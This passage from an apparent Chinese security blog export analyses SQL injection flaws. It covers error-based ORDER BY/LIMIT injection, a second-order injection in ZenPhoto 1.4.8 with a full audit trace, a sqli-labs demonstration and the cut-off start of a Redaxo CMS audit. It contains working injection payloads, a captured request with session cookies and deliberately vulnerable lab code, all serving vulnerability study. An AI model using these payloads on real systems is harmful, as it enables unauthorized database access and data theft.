BY 1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);ERROR 1105 (HY000): XPATH syntax error: &apos;:10.0.22-MariaDB&apos; 其他除了 ORDER BY 的注入外，偶尔也会碰到 LIMIT 注入，与 ORDER BY 不同的是，LIMIT 后可以接 UNION SELECT 子句，当然前提是 LIMIT 前没有 ORDER BY 关键字。 从前面的 SELECT 语法中可知，在报错注入姿势上，ORDER BY 和 LIMIT 的利用一致，都是依赖 PROCEDURE 关键字，但该方法也有局限，此方法只适用于 MySQL 小于5.6.6的5.x系列。 最后最近在挖漏洞过程中明显感觉的常规的注入问题变少了，猜测了下原因，可能一是各种扫描器大范围的扫描，二是开发者的安全意识提高了吧。不管怎样，这是好的趋势，安全问题若不修复，就会一直躺在那直到被人发现并利用。问题变少，说明厂商和白帽子都在努力。","raw":null,"content":null,"categories":[],"tags":[]},{"title":"ZenPhoto 1.4.8 二阶 SQL 注入漏洞","slug":"zenphoto-1-4-8-second-order-sql-injection","date":"2016-06-30T07:01:06.000Z","updated":"2017-01-09T15:40:18.000Z","comments":true,"path":"2016/06/30/zenphoto-1-4-8-second-order-sql-injection/","link":"","permalink":"http://yoursite.com/2016/06/30/zenphoto-1-4-8-second-order-sql-injection/","excerpt":"","text":"来源：https://www.exploit-db.com/exploits/37602/ 背景ZenPhoto是一款小巧的相册软件，具备RSS输出、FTP上传方式、Tag功能、评论回复等功能。基于PHP+MySQL环境，它的主旨是简单，这也就是说不管是用户还是网站管理员，都可以很容易的使用它。 关于二阶注入，上一篇文章有写过Second Order SQL Injection 漏洞复现访问 http://localhost:8888/zenphoto-zenphoto-1.4.8/zp-core/admin-options.php?saved&amp;tab=gallery 找到Sort gallery by字段，设置为Custom，并在custom filed字段后面输入id,extractvalue(0x0a,concat(0x0a,(select version())))%23，最后点Apply 访问 http://localhost:8888/zenphoto-zenphoto-1.4.8/zp-core/admin-upload.php?page=upload&amp;tab=http&amp;type=images 如果服务端开启了报错，那么就能在这个页面找到报错消息。当然一般线上服务我们都会关闭掉报错，这也没关系，继续访问 http://localhost:8888/zenphoto-zenphoto-1.4.8/zp-core/admin-logs.php?page=logs 就能看到报错日志了，其中就抛出了数据库版本号 审计那么在点Apply的时候，发生了什么呢？我拦下了数据包 12345678910111213POST /zenphoto-zenphoto-1.4.8/zp-core/admin-options.php?action=saveoptions HTTP/1.1Host: localhost:8888User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:46.0) Gecko/20100101 Firefox/46.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://localhost:8888/zenphoto-zenphoto-1.4.8/zp-core/admin-options.php?saved&amp;tab=galleryCookie: zp_user_auth=93a28nygQ7CdX50LI5BdCyNYFJ8qW0wFgyGonO1hD%2FM%3D.7; iweb_safecode=56cfc43b80MDQ3MTMxMDAwMDJlNzEyPGozNTAzNWIxMGJlM2ViNjE5NGo3ND5nNTwxZmAzN2c7OT9jNWI1OjYyPDA1ZjQ2Yw; bdshare_firstime=1463652902675; PHPSESSID=1539753e6d1894d0e9af01be376fa794Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 689XSRFToken=3c826630e2a936b757048ca5459610812694caba&amp;savegalleryoptions=yes&amp;password_enabled=0&amp;gallery_title_en_US=%E7%9B%B8%E9%A6%86&amp;Gallery_description_en_US=You+can+insert+your+Gallery+description+on+the+Admin+Options+Gallery+tab.&amp;gallery_security=public&amp;user=&amp;pass=&amp;pass=&amp;hint_en_US=&amp;gallery-page_archive=0&amp;gallery-page_contact=0&amp;gallery-page_favorites=0&amp;gallery-page_register=0&amp;gallery-page_index=0&amp;gallery_page_unprotected_contact=1&amp;gallery_page_unprotected_register=1&amp;website_title_en_US=&amp;website_url=&amp;thumbselector=1&amp;gallery_sorttype=custom&amp;customalbumsort=id%2Cextractvalue%280x0a%2Cconcat%280x0a%2C%28select+version%28%29%29%29%29%2523&amp;album_default=1&amp;image_default=1&amp;codeblock1-0= 定位到/zenphoto-zenphoto-1.4.8/zp-core/admin-options.php文件，找到savegalleryoptions相关代码 1234567891011121314151617181920212223242526272829303132333435363738/* * * Gallery options ** */if (isset($_POST['savegalleryoptions'])) &#123; $_zp_gallery-&gt;setAlbumPublish((int) isset($_POST['album_default'])); $_zp_gallery-&gt;setImagePublish((int) isset($_POST['image_default'])); setOption('AlbumThumbSelect', sanitize_numeric($_POST['thumbselector'])); $_zp_gallery-&gt;setThumbSelectImages((int) isset($_POST['thumb_select_images'])); $_zp_gallery-&gt;setSecondLevelThumbs((int) isset($_POST['multilevel_thumb_select_images'])); $_zp_gallery-&gt;setTitle(process_language_string_save('gallery_title', 2)); $_zp_gallery-&gt;setDesc(process_language_string_save('Gallery_description', EDITOR_SANITIZE_LEVEL)); $_zp_gallery-&gt;setWebsiteTitle(process_language_string_save('website_title', 2)); $web = sanitize($_POST['website_url'], 3); $_zp_gallery-&gt;setWebsiteURL($web); $_zp_gallery-&gt;setAlbumUseImagedate((int) isset($_POST['album_use_new_image_date'])); $st = strtolower(sanitize($_POST['gallery_sorttype'], 3)); if ($st == 'custom') $st = strtolower(sanitize($_POST['customalbumsort'], 3)); $_zp_gallery-&gt;setSortType($st); if (($st == 'manual') || ($st == 'random')) &#123; $_zp_gallery-&gt;setSortDirection(false); &#125; else &#123; $_zp_gallery-&gt;setSortDirection(isset($_POST['gallery_sortdirection'])); &#125; foreach ($_POST as $item =&gt; $value) &#123; if (strpos($item, 'gallery-page_') === 0) &#123; $item = sanitize(substr(postIndexDecode($item), 13)); $_zp_gallery-&gt;setUnprotectedPage($item, (int) isset($_POST['gallery_page_unprotected_' . $item])); &#125; &#125; $_zp_gallery-&gt;setSecurity(sanitize($_POST['gallery_security'], 3)); $notify = processCredentials($_zp_gallery); if (zp_loggedin(CODEBLOCK_RIGHTS)) &#123; $_zp_gallery-&gt;setCodeblock(processCodeblockSave(0)); &#125; $_zp_gallery-&gt;save(); $returntab = \"&amp;tab=gallery\";&#125; 定位到gallery_sorttype参数， $st = strtolower(sanitize($_POST[&#39;gallery_sorttype&#39;], 3));，留意到这里对$_POST进来的值传到了sanitize函数。该函数的在文件/zenphoto-zenphoto-1.4.8/zp-core/functions-common.php 1234567891011function sanitize($input_string, $sanitize_level = 3) &#123; if (is_array($input_string)) &#123; $output_string = array(); foreach ($input_string as $output_key =&gt; $output_value) &#123; $output_string[$output_key] = sanitize($output_value, $sanitize_level); &#125; &#125; else &#123; $output_string = sanitize_string($input_string, $sanitize_level); &#125; return $output_string;&#125; 这个函数对传入$input_string先判断是否是数组，如果是，就遍历数组，过滤每个值。如果不是，就直接将\u0010$input_string丢入sanitize_string函数去做过滤，最后返回过滤后的值。其实这里有点不严谨，因为如果传入是数组的话，仅仅对value做了过滤，而key是原样保留的，会有安全隐患。我简单改造了下这个函数 12345678910111213function sanitize($input_string, $sanitize_level = 3) &#123; if (is_array($input_string)) &#123; $output_string = array(); foreach ($input_string as $output_key =&gt; $output_value) &#123; $output_key = sanitize($output_key, $sanitize_level); $output_value = sanitize($output_value, $sanitize_level); $output_string[$output_key] = $output_value; &#125; &#125; else &#123; $output_string = sanitize_string($input_string, $sanitize_level); &#125; return $output_string;&#125; 继续在该文件里跟踪sanitize_string函数 123456789101112131415161718192021222324252627282930function sanitize_string($input, $sanitize_level) &#123; // Strip slashes if get_magic_quotes_gpc is enabled. if (is_string($input)) &#123; if (get_magic_quotes_gpc()) &#123; $input = stripslashes($input); &#125; $input = str_replace(chr(0), \" \", $input); switch ($sanitize_level) &#123; case 0: return $input; case 2: // Strips non-style tags. $input = sanitize_script($input); return ksesProcess($input, getAllowedTags('style_tags')); case 3: // Full sanitation. Strips all code. return getBare($input); case 1: // Text formatting sanititation. $input = sanitize_script($input); return ksesProcess($input, getAllowedTags('allowed_tags')); case 4: default: // for internal use to eliminate security injections return sanitize_script($input); &#125; &#125; return $input;&#125; 这个函数在服务器开启gpc的情况下，会先对参数stripslashes一下，sanitize_level为3的情况下，将$input传入了getBare函数，并返回该函数执行结果。跟进getBare函数 123456789function getBare($content) &#123; $content = preg_replace('~&lt;script.*?/script&gt;~is', '', $content); $content = preg_replace('~&lt;style.*?/style&gt;~is', '', $content); $content = preg_replace('~&lt;!--.*?--&gt;~is', '', $content); $content = strip_tags($content); $content = str_replace('&amp;nbsp;', ' ', $content); $content = html_entity_decode($content, ENT_QUOTES, 'UTF-8'); return $content;&#125; 可以看到仅仅是替换了一些html标签，并将HTML实体转换为字符，然后就返回内容了，看来做得并不多。 回到savegalleryoptions代码块 1234$st = strtolower(sanitize($_POST['gallery_sorttype'], 3));if ($st == 'custom') $st = strtolower(sanitize($_POST['customalbumsort'], 3));$_zp_gallery-&gt;setSortType($st); strtolower函数将输入的内容都转换为了小写，$_POST[‘customalbumsort’]的内容也经过了sanitize函数的过滤，最后就调用了_zp_galleryd的\u0010setSortType方法，继续跟进，找到_zp_gallery实例 $_zp_gallery即为Gallery类的一个实例，定义了一些protected变量 可以看到setSortType函数直接把参数传递给了set函数，在文件中找到set函数的定义 123function set($field, $value) &#123; $this-&gt;data[$field] = $value;&#125; 这里将参数值赋值给了受保护的变量$data，接下来继续回到savegalleryoptions代码块 12$_zp_gallery-&gt;save();$returntab = \"&amp;tab=gallery\"; $_zp_gallery实例调用了save方法，从Gallery类中找到save方法，将$this-&gt;data值serialize序列化后传递给了setOption函数 123function save() &#123; setOption('gallery_data', serialize($this-&gt;data));&#125; 跟进setOption函数，在文件/zenphoto-zenphoto-1.4.8/zp-core/functions-basic.php 12345678910111213141516171819202122232425262728293031function setOption($key, $value, $persistent = true, $creator = NULL) &#123; global $_zp_options; if ($persistent) &#123; $sql = 'INSERT INTO ' . prefix('options') . ' (`name`,`ownerid`,`theme`,`value`,`creator`) VALUES (' . db_quote($key) . ',0,\"\",'; $sqlu = ' ON DUPLICATE KEY UPDATE `value`='; if (is_null($value)) &#123; $sql .= 'NULL'; $sqlu .= 'NULL'; &#125; else &#123; $sql .= db_quote($value); $sqlu .= db_quote($value); &#125; if (is_null($creator)) &#123; $sql .= ',NULL'; &#125; else &#123; $sql .= ','.db_quote($creator); &#125; $sql .= ') ' . $sqlu; $result = query($sql, false); &#125; else &#123; $result = true; &#125; if ($result) &#123; $_zp_options[strtolower($key)] = $value; return true; &#125; else &#123; return false; &#125;&#125; 这里我们传入$key是gallery_data，$value是序列化后的$this-&gt;data，从代码中可以看到这两个在INSERT INTO前都要经过db_quote函数处理，跟进db_quote，我本地选择的mysqli扩展，所以定位到此文件/zenphoto-zenphoto-1.4.8/zp-core/functions-db-MySQLi.php 1234function db_quote($string) &#123; global $_zp_DB_connection; return \"'\" . $_zp_DB_connection-&gt;real_escape_string($string) . \"'\";&#125; 这里的$_zp_DB_connection即为我mysqli连接串，接着$_zp_DB_connection-&gt;real_escape_string($string)其实是一种面向对象的写法，面向过程的写法是这样的string mysqli_real_escape_string ( mysqli $link , string $escapestr )，官方文档里有说明该函数过滤哪些字符。 看来db_quote还是有用的，毕竟单双引号都被干掉了，所以这个输入点的是无法构造出带单双引号的payload的，回到漏洞复现的步骤，当时填入的payload是id,extractvalue(0x0a,concat(0x0a,(select version())))%23，这个payload是不受到过滤函数影响的，从数据库也可以看到payload被完整的插入进去了 到这里可以看到该二阶注入的第一步已经成功了，下面继续分析 访问 http://localhost:8888/zenphoto-zenphoto-1.4.8/zp-core/admin-upload.php?page=upload&amp;tab=http&amp;type=images 能触发漏洞，找到相关位置，/zenphoto-zenphoto-1.4.8/zp-core/admin-upload.php，66行 genAlbumList($albumlist); 找到该函数实现的位置，文件/zenphoto-zenphoto-1.4.8/zp-core/admin-functions.php 12345678910111213141516171819202122232425262728function genAlbumList(&amp;$list, $curAlbum = NULL, $rights = UPLOAD_RIGHTS) &#123; global $_zp_gallery; if (is_null($curAlbum)) &#123; $albums = array(); $albumsprime = $_zp_gallery-&gt;getAlbums(0); foreach ($albumsprime as $album) &#123; // check for rights $albumobj = newAlbum($album); if ($albumobj-&gt;isMyItem($rights)) &#123; $albums[] = $album; &#125; &#125; &#125; else &#123; $albums = $curAlbum-&gt;getAlbums(0); &#125; if (is_array($albums)) &#123; foreach ($albums as $folder) &#123; $album = newAlbum($folder); if ($album-&gt;isDynamic()) &#123; if ($rights == ALL_ALBUMS_RIGHTS) &#123; $list[$album-&gt;getFileName()] = $album-&gt;getTitle(); &#125; &#125; else &#123; $list[$album-&gt;getFileName()] = $album-&gt;getTitle(); genAlbumList($list, $album, $rights); /* generate for subalbums */ &#125; &#125; &#125;&#125; $albumsprime = $_zp_gallery-&gt;getAlbums(0);，这里有个我们熟悉的类实例$_zp_gallery，跟进/zenphoto-zenphoto-1.4.8/zp-core/class-gallery.php 1234567891011121314151617181920function getAlbums($page = 0, $sorttype = null, $direction = null, $care = true, $mine = NULL) &#123;// Have the albums been loaded yet? if ($mine || is_null($this-&gt;albums) || $care &amp;&amp; $sorttype . $direction !== $this-&gt;lastalbumsort) &#123; $albumnames = $this-&gt;loadAlbumNames(); $key = $this-&gt;getAlbumSortKey($sorttype); $albums = $this-&gt;sortAlbumArray(NULL, $albumnames, $key, $direction, $mine);// Store the values $this-&gt;albums = $albums; $this-&gt;lastalbumsort = $sorttype . $direction; &#125; if ($page == 0) &#123; return $this-&gt;albums; &#125; else &#123; return array_slice($this-&gt;albums, galleryAlbumsPerPage() * ($page - 1), galleryAlbumsPerPage()); &#125;&#125; $sorttype变量值为NULL，注意这里的\u0010$key参数，这个就是被我们污染了的变量，跟进下getAlbumSortKey的由来，/zenphoto-zenphoto-1.4.8/zp-core/class-gallery.php 123456function getAlbumSortKey($sorttype = null) &#123; if (empty($sorttype)) &#123; $sorttype = $this-&gt;getSortType(); &#125; return lookupSortKey($sorttype, 'sort_order', 'albums');&#125; 由于传入的$sorttype为NULL，所以进入了if判断，调用getSortType函数去了，跟进/zenphoto-zenphoto-1.4.8/zp-core/class-gallery.php 1234function getSortType() &#123; $type = $this-&gt;get('gallery_sorttype'); return $type;&#125; 这里回去调用get方法，并返回结果，所以找get方法去 123456function get($field) &#123; if (isset($this-&gt;data[$field])) &#123; return $this-&gt;data[$field]; &#125; return NULL;&#125; 这里传入一个$field，会返回$this-&gt;data值，而这个$this-&gt;data在构造函数中的实现为/zenphoto-zenphoto-1.4.8/zp-core/class-gallery.php 12345678910111213function __construct() &#123;// Set our album directory $this-&gt;albumdir = ALBUM_FOLDER_SERVERPATH; $data = getOption('gallery_data'); if ($data) &#123; $this-&gt;data = getSerializedArray($data); &#125; if (isset($this-&gt;data['unprotected_pages'])) &#123; $pages = getSerializedArray($this-&gt;data['unprotected_pages']); if (is_array($pages)) $this-&gt;unprotected_pages = $pages; // protect against a failure &#125;&#125; 跟进getOption函数/zenphoto-zenphoto-1.4.8/zp-core/functions-basic.php 1234567891011121314151617181920function getOption($key) &#123; global $_zp_conf_vars, $_zp_options; $key = strtolower($key); if (is_null($_zp_options) &amp;&amp; function_exists('query_full_array')) &#123; // may be too early to use database! // option table not yet loaded, load it (but not the theme options!) $sql = \"SELECT `name`, `value` FROM \" . prefix('options') . ' WHERE (`theme`=\"\" OR `theme` IS NULL) AND `ownerid`=0'; $optionlist = query_full_array($sql, false); if ($optionlist !== false) &#123; $_zp_options = array(); foreach ($optionlist as $option) &#123; $_zp_options[strtolower($option['name'])] = $option['value']; &#125; &#125; &#125; if (isset($_zp_options[$key])) &#123; return $_zp_options[$key]; &#125; else &#123; return NULL; &#125;&#125; 它会去数据库的options表里面去取对应$key字段的value并返回，而我们传入的$key=gallery_data，得到value字段值为 a:21:{s:21:&quot;gallery_sortdirection&quot;;i:0;s:16:&quot;gallery_sorttype&quot;;s:56:&quot;id,extractvalue(0x0a,concat(0x0a,(select version())))%23&quot;;s:13:&quot;gallery_title&quot;;s:31:&quot;a:1:{s:5:&quot;en_US&quot;;s:6:&quot;相馆&quot;;}&quot;;s:19:&quot;Gallery_description&quot;;s:99:&quot;a:1:{s:5:&quot;en_US&quot;;s:73:&quot;You can insert your Gallery description on the Admin Options Gallery tab.&quot;;}&quot;;s:16:&quot;gallery_password&quot;;N;s:12:&quot;gallery_user&quot;;N;s:12:&quot;gallery_hint&quot;;N;s:10:&quot;hitcounter&quot;;N;s:13:&quot;current_theme&quot;;s:7:&quot;default&quot;;s:13:&quot;website_title&quot;;s:0:&quot;&quot;;s:11:&quot;website_url&quot;;s:0:&quot;&quot;;s:16:&quot;gallery_security&quot;;s:6:&quot;public&quot;;s:16:&quot;login_user_field&quot;;N;s:24:&quot;album_use_new_image_date&quot;;i:0;s:19:&quot;thumb_select_images&quot;;i:0;s:17:&quot;unprotected_pages&quot;;s:43:&quot;a:2:{i:0;s:8:&quot;register&quot;;i:1;s:7:&quot;contact&quot;;}&quot;;s:13:&quot;album_publish&quot;;i:1;s:13:&quot;image_publish&quot;;i:1;s:30:&quot;multilevel_thumb_select_images&quot;;i:0;s:14:&quot;sort_direction&quot;;i:0;s:9:&quot;codeblock&quot;;s:6:&quot;a:0:{}”;} 回到构造函数，这个值赋值给$data，然后传入getSerializedArray函数，跟进一下/zenphoto-zenphoto-1.4.8/zp-core/functions-common.php 1234567891011121314151617function getSerializedArray($string) &#123; if (is_array($string)) &#123; return $string; &#125; if (preg_match('/^a:[0-9]+:&#123;/', $string)) &#123; $r = @unserialize($string); if ($r) &#123; return $r; &#125; else &#123; return array(); &#125; &#125; else if (strlen($string) == 0 &amp;&amp; !is_bool($string)) &#123; return array(); &#125; else &#123; return array($string); &#125;&#125; 这里就是做一下简单的反序列化处理，以数组形式将结果返回。 这样就得到$this-&gt;data[‘gallery_sorttype’]的值id,extractvalue(0x0a,concat(0x0a,(select version())))%23，也就是$sorttype的值为id,extractvalue(0x0a,concat(0x0a,(select version())))%23，即$key的值。 接下来又调用了sortAlbumArray函数，找到该函数/zenphoto-zenphoto-1.4.8/zp-core/class-gallery.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071function sortAlbumArray($parentalbum, $albums, $sortkey = '`sort_order`', $sortdirection = NULL, $mine = NULL) &#123; if (count($albums) == 0) &#123; return array(); &#125; if (is_null($mine) &amp;&amp; zp_loggedin(MANAGE_ALL_ALBUM_RIGHTS)) &#123; $mine = true; &#125; if (is_null($parentalbum)) &#123; $albumid = ' IS NULL'; $obj = $this; $viewUnpublished = $mine; &#125; else &#123; $albumid = '=' . $parentalbum-&gt;getID(); $obj = $parentalbum; $viewUnpublished = (zp_loggedin() &amp;&amp; $obj-&gt;albumSubRights() &amp; (MANAGED_OBJECT_RIGHTS_EDIT | MANAGED_OBJECT_RIGHTS_VIEW)); &#125; if (($sortkey == '`sort_order`') || ($sortkey == 'RAND()')) &#123; // manual sort is always ascending $order = false; &#125; else &#123; if (!is_null($sortdirection)) &#123; $order = strtoupper($sortdirection) == 'DESC'; &#125; else &#123; $order = $obj-&gt;getSortDirection('album'); &#125; &#125; $sql = 'SELECT * FROM ' . prefix(\"albums\") . ' WHERE `parentid`' . $albumid . ' ORDER BY ' . $sortkey . ' ' . $sortdirection; $result = query($sql); $results = array();// check database aganist file system while ($row = db_fetch_assoc($result)) &#123; $folder = $row['folder']; if (($key = array_search($folder, $albums)) !== false) &#123; // album exists in filesystem $results[$row['folder']] = $row; unset($albums[$key]); &#125; else &#123; // album no longer exists $id = $row['id']; query(\"DELETE FROM \" . prefix('albums') . \" WHERE `id`=$id\"); // delete the record query(\"DELETE FROM \" . prefix('comments') . \" WHERE `type` ='images' AND `ownerid`= '$id'\"); // remove image comments query(\"DELETE FROM \" . prefix('obj_to_tag') . \"WHERE `type`='albums' AND `objectid`=\" . $id); query(\"DELETE FROM \" . prefix('albums') . \" WHERE `id` = \" . $id); &#125; &#125; db_free_result($result); foreach ($albums as $folder) &#123; // these albums are not in the database $albumobj = newAlbum($folder); if ($albumobj-&gt;exists) &#123; // fail to instantiate? $results[$folder] = $albumobj-&gt;getData(); &#125; &#125;// now put the results in the right order $results = sortByKey($results, $sortkey, $order);// albums are now in the correct order $albums_ordered = array(); foreach ($results as $row) &#123; // check for visible $folder = $row['folder']; $album = newAlbum($folder); switch (checkPublishDates($row)) &#123; case 1: $album-&gt;setShow(0); $album-&gt;save(); case 2: $row['show'] = 0; &#125; if ($mine || $row['show'] || (($list = $album-&gt;isMyItem(LIST_RIGHTS)) &amp;&amp; is_null($album-&gt;getParent())) || (is_null($mine) &amp;&amp; $list &amp;&amp; $viewUnpublished)) &#123; $albums_ordered[] = $folder; &#125; &#125; return $albums_ordered;&#125; 至此，二阶注入的第二步分析完，完整的过程就是这样，最后看下mysql的执行log\u0010，之前存入的payload被执行了即触发了漏洞。 总结正如exploit-db上所说的，ZenPhoto1.4.8存在很多处二阶注入的地方。本质上仍然是在对用户可控的输入点过滤不够，过分依赖系统函数。","raw":null,"content":null,"categories":[],"tags":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/安全/"}]},{"title":"关于二阶 SQL 注入","slug":"Second-Order-SQL-Injection","date":"2016-06-22T09:47:19.000Z","updated":"2017-01-09T15:40:24.000Z","comments":true,"path":"2016/06/22/Second-Order-SQL-Injection/","link":"","permalink":"http://yoursite.com/2016/06/22/Second-Order-SQL-Injection/","excerpt":"","text":"背景从乌云平台公开的案例来看，大部分的SQL注入漏洞均发生在单个HTTP请求和响应中，也就是说要触发漏洞，需经过以下步骤： 客户端请求构造payload并发起请求 服务端执行了payload 客户端收到响应结果 而二阶（Second Order）SQL注入相对来说更隐晦一些，需经过以下步骤： 客户端构造payload并发起请求 服务端存储payload 客户端发起另一请求 服务端执行了存储的payload 客户端收到响应结果 可以对比看到，二阶注入很隐蔽，很难被黑盒测试检测到，这也是现在各大漏洞平台二阶注入案例少的原因之一吧。 分析二阶可以理解为两步吧，当将用户的输入存储在某个地方，然后在另一处功能的SQL语句中使用它的时候，既没有进行正确的过滤也没有使用参数化查询，这就造成了二阶注入。至于它的影响的话和普通SQL注入没什么差别。 下面代码来自于sqli-labs 12345678910111213141516171819202122232425262728293031323334353637383940414243// Less-5/index.php...//including the Mysql connect parameters.include(\"../sql-connections/sql-connect.php\");error_reporting(0);// take the variablesif(isset($_GET['id']))&#123;$id=$_GET['id'];//logging the connection parameters to a file for analysis.$fp=fopen('result.txt','a');fwrite($fp,'ID:'.$id.\"\\n\");fclose($fp);// connectivity$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; echo 'You are in...........'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font size=\"3\" color=\"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/br&gt;&lt;/font&gt;\"; echo '&lt;font color= \"#0000ff\" font size= 3&gt;'; &#125;&#125; else &#123; echo \"Please input the ID as parameter with numeric value\";&#125;... 代码里的$id被直接保存到了result.txt文件，为了更形象的表示出二阶注入，我新写了一个页面。 123456789101112131415161718192021222324252627282930313233343536373839// Less-5/second.php...//including the Mysql connect parameters.include(\"../sql-connections/sql-connect.php\");error_reporting(0);$fp = fopen('result.txt','r');while(!feof($fp)) &#123; $line = fgets($fp); $arrId = explode(\":\", $line); $id = trim($arrId[1], \"\\n\"); $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) &#123; echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; echo 'You are in...........'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font size=\"3\" color=\"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/br&gt;&lt;/font&gt;\"; echo '&lt;font color= \"#0000ff\" font size= 3&gt;'; &#125;&#125;fclose($fp);... second.php从result.txt文件里读取记录，获取$id的值并代入SQL查询。具体攻击步骤如下： 访问index.php，构造参数id值为1&#39; and (select 1 from (select count(*),concat(version(),0x7e,floor(rand()*2))a from information_schema.tables group by a)b)#，完整URL如下 http://localhost:8888/sqli-labs/Less-5/?id=1&apos; and (select 1 from (select count(*),concat(version(),0x7e,floor(rand()*2))a from information_schema.tables group by a)b)# id的值被写入了result.txt 发起另一请求，访问second.php SQL语句报错\u0010，回显出了数据库版本信息 检测方式就其本身来说就是个SQL注入，只不过触发方式相对隐晦了一些。一般情况下很难用自动化工具扫出来，最好可以白盒审计源代码，我一般在审计源码的时候会对所有数据库执行的语句做日志记录，对可能出现注入的点输入对应payload，然后查看日志来分析是否有注入问题。当然黑盒情况下也是可能找到二阶注入的，可以利用cloudeye等平台构造合适的payload（cloudeye支持callback哦）来发现这些隐晦的注入问题。 总结二阶注入比普通的SQL注入更难检测，因为漏洞触发点并不在攻击者提交请求的页面。其防御方式和普通SQL注入没差别，使用参数化查询语句，分离数据和代码。w","raw":null,"content":null,"categories":[],"tags":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/安全/"}]},{"title":"Redaxo CMS 5.0.0 SQL 注入漏洞","slug":"Redaxo-CMS-5-0-0-SQL-Injection","date":"2016-06-04T13:28:39.000Z","updated":"2017-01-09T15:40:29.000Z","comments":true,"path":"2016/06/04/Redaxo-CMS-5-0-0-SQL-Injection/","link":"","permalink":"http://yoursite.com/2016/06/04/Redaxo-CMS-5-0-0-SQL-Injection/","excerpt":"","text":"来源https://www.exploit-db.com/exploits/39459/ 背景在逛exploit-db的时候，发现这个漏洞有点意思，就拿过来自己分析了下。Redaxo CMS是一套开源的Web门户内容管理系统（CMS），该系统支持自定义模块、插件扩展、项目备份等。 审计根据报错信息可以定位到该文件，/redaxo-cms-5.0.0/redaxo/src/addons/mediapool/pages/media.php，第582行-608行 1234567891011121314151617181920212223242526272829... $where = 'f.category_id=' . $rex_file_category; $addTable = ''; if ($media_name != '') &#123; $media_name = str_replace(['_', '%'], ['\\_', '\\%'], $media_name); $where = \"(f.filename LIKE '%\" . $media_name . \"%' OR f.title LIKE '%\" . $media_name . \"%')\"; if (rex_addon::get('mediapool')-&gt;getConfig('searchmode', 'local') != 'global' &amp;&amp; $rex_file_category != 0) &#123; $addTable = rex::getTablePrefix() . 'media_category c, '; $where .= ' AND f.category_id = c.id '; $where .= \" AND (c.path LIKE '%|\" . $rex_file_category . \"|%' OR c.id=\" . $rex_file_category . ') '; &#125; &#125; if (isset($args['types'])) &#123; $types = []; foreach (explode(',', $args['types']) as $type) &#123; $types[] = 'LOWER(RIGHT(f.filename, LOCATE(\".\", REVERSE(f.filename))-1))=\"' . strtolower(htmlspecialchars($type)) . '\"'; &#125; $where .= ' AND (' . implode(' OR ', $types) . ')'; &#125; $qry = 'SELECT * FROM ' . $addTable . rex::getTablePrefix() . 'media f WHERE ' . $where . ' ORDER BY f.updatedate desc, f.id desc'; // ----- EXTENSION POINT $qry = rex_extension::registerPoint(new rex_extension_point('MEDIA_LIST_QUERY', $qry, [ 'category_id' =&gt; $rex_file_category, ])); $files = rex_sql::factory();// $files-&gt;setDebug(); $files-&gt;setQuery($qry); ... 也就是 1$qry = 'SELECT * FROM ' . $addTable . rex::getTablePrefix() . 'media f WHERE ' . $where . ' ORDER BY f.updatedate desc, f.id desc'; 这条sql语句存在问题了，那么关键看下 $where变量是否可控，继续向上找，$where中一共拼接了两个变量，media_name和rex_file_category，那么先看media_name是从哪里来的，定位到/redaxo-cms-5.0.0/redaxo/src/addons/mediapool/pages/media.php，第8行 1$media_name = rex_request('media_name', 'string'); 接下来继续找到rex_request函数的实现位置，查看对请求做了哪些封装，定位到/redaxo-cms-5.0.0/redaxo/src/core/functions/function_rex_globals.php，第29行-37行 123456789/** * @see rex_request::request() * * @package redaxo\\core */function rex_request($varname, $vartype = '', $default = '')&#123; return rex_request::request($varname, $vartype, $default);&#125; 可以看到这个函数实际上是去调用了rex_request类的request方法，于是去找rex_request类的实现代码去，定位到/redaxo-cms-5.0.0/redaxo/src/core/lib/request.php，第38行-50行 12345678910111213/** * Returns the variable $varname of $_REQUEST and casts the value. * * @param string $varname Variable name * @param string $vartype Variable type * @param mixed $default Default value * * @return mixed */ public static function request($varname, $vartype = '', $default = '') &#123; return self::arrayKeyCast($_REQUEST, $varname, $vartype, $default); &#125; 这里又调用了rex_request类自身的arrayKeyCast方法，找到该方法的实现，第168行-194行 123456789101112131415161718192021222324252627/** * Searches the value $needle in array $haystack and returns the casted value. * * @param array $haystack Array * @param string|int $needle Value to search * @param string $vartype Variable type * @param mixed $default Default value * * @throws InvalidArgumentException * * @return mixed */ private static function arrayKeyCast(array $haystack, $needle, $vartype, $default = '') &#123; if (!is_scalar($needle)) &#123;// 判断$needle是否是标量 throw new InvalidArgumentException('Scalar expected for $needle in arrayKeyCast()!'); &#125; if (array_key_exists($needle, $haystack)) &#123;// 如果$haystack含有$needle键 return rex_type::cast($haystack[$needle], $vartype); &#125; if ($default === '') &#123; return rex_type::cast($default, $vartype); &#125; return $default; &#125; 注意到传给arrayKeyCast的$haystack参数值是$_REQUEST来的，$needle参数值是media_name，$vartype参数值是string，所以进入了 12345...if (array_key_exists($needle, $haystack)) &#123;// 如果$haystack含有$needle键 return rex_type::cast($haystack[$needle], $vartype); &#125;... 后直接调用了rex_type类的cast方法校验变量类型，找到cast方法的实现代码，/redaxo-cms-5.0.0/redaxo/src/core/lib/util/type.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126/** * Casts the variable $var to $vartype. * * Possible types: * - 'bool' (or 'boolean') * - 'int' (or 